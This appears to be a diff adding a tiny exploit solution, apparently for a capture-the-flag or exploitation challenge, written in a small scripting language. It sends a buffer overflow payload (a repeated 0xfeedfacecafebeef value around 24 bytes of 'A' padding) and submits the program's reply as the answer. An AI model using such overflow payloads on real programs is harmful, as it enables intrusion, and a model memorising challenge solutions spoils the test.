@@ -1,0 +1,6 @@
+act exploit():
+    write(0xfeedfacecafebeef . "A"x24 . 0xfeedfacecafebeef . "\n")
+    return rtrim(read("\n"))
+
+submit:
+    return exploit()
